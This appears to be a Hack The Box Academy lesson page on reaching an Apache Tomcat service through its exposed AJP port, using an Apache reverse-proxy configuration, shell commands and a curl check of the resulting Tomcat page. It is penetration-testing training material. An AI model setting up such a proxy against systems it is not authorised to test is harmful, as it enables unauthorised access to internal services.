<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/145/section/1296
// Platform Version: V1
// Module ID: 145
// Module Name: Server-side Attacks
// Module Difficulty: Medium
// Section ID: 1296
// Section Title: Apache Reverse Proxy & AJP
// Page Title: Server-side Attacks
// Page Number: 04
-->

# Apache Reverse Proxy & AJP

**Module Name:** Server-side Attacks **Page Number:** 04

#### SERVER-SIDE ATTACKS

# Apache Reverse Proxy & AJP

``` shell-session
ndefstathiou@htb[/htb]$ sudo apt install libapache2-mod-jk
ndefstathiou@htb[/htb]$ sudo a2enmod proxy_ajp
ndefstathiou@htb[/htb]$ sudo a2enmod proxy_http
ndefstathiou@htb[/htb]$ export TARGET="<TARGET_IP>"
ndefstathiou@htb[/htb]$ echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
ndefstathiou@htb[/htb]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
ndefstathiou@htb[/htb]$ sudo systemctl start apache2
```

#### Accessing the "hidden" Tomcat page

``` shell-session
ndefstathiou@htb[/htb]$ curl http://127.0.0.1

<SNIP>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Apache Tomcat/X.X.XX</title>
        <link href="favicon.ico" rel="icon" type="image/x-icon" />
        <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
        <link href="tomcat.css" rel="stylesheet" type="text/css" />
    </head>

    <body>
        <div id="wrapper">
            <div id="navigation" class="curved container">
                <span id="nav-home"><a href="https://tomcat.apache.org/">Home</a></span>
                <span id="nav-hosts"><a href="/docs/">Documentation</a></span>
                <span id="nav-config"><a href="/docs/config/">Configuration</a></span>
                <span id="nav-examples"><a href="/examples/">Examples</a></span>
                <span id="nav-wiki"><a href="https://wiki.apache.org/tomcat/FrontPage">Wiki</a></span>
                <span id="nav-lists"><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></span>
                <span id="nav-help"><a href="https://tomcat.apache.org/findhelp.html">Find Help</a></span>
                <br class="separator" />
            </div>
            <div id="asf-box">
                <h1>Apache Tomcat/X.X.XX</h1>
            </div>
            <div id="upper" class="curved container">
                <div id="congrats" class="curved container">
                    <h2>If you're seeing this, you've successfully installed Tomcat. Congratulations!</h2>
                </div>
<SNIP>
```

![https://academy.hackthebox.com/storage/modules/145/img/tomcat.png](https://academy.hackthebox.com/storage/modules/145/img/tomcat.png)

####